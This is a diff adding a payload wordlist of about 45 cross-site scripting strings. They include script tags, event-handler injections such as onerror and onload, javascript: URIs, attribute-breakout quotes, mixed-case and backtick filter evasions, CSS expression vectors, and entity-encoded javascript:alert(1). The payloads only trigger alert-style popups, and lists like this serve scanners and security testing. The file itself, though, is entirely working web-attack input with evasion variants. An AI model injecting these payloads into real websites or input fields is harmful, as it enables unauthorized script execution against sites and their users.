@@ -1,0 +1,45 @@
+<script>alert(1)</script>
+<script>alert('xss')</script>
+<script>alert("xss")</script>
+<script>prompt(1)</script>
+<script>confirm(1)</script>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert('xss')>
+<img src=1 onerror=alert(1)>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<body onload=alert(1)>
+<iframe src="javascript:alert(1)">
+<iframe src=javascript:alert(1)>
+<input onfocus=alert(1) autofocus>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<p onmouseover=alert(1)>test
+<a href="javascript:alert(1)">click</a>
+<a href=javascript:alert(1)>click</a>
+" onmouseover="alert(1)
+' onmouseover='alert(1)
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+</script><script>alert(1)</script>
+<ScRiPt>alert(1)</ScRiPt>
+<SCRIPT>alert(1)</SCRIPT>
+<svg/onload=alert`1`>
+<svg/onload=confirm`1`>
+<svg/onload=prompt`1`>
+<details/open/ontoggle/="alert(1)">
+<iframe srcdoc="<script>alert(1)</script>">
+<object data="javascript:alert(1)">
+<isindex type=image src=1 onerror=alert(1)>
+<video onerror=alert(1)><source>
+<audio onerror=alert(1)><source>
+<math><iframe/src=javascript:alert(1)>
+<LINK REL="stylesheet" HREF="javascript:alert(1)">
+<STYLE>@import"javascript:alert(1)";</STYLE>
+<DIV STYLE="background:url(javascript:alert(1))">
+<DIV STYLE="background:expression(alert(1))">
+javascript:alert(1)
+JaVaScRiPt:alert(1)
+javaSCRIPT:alert(1)
+&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;
+&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;
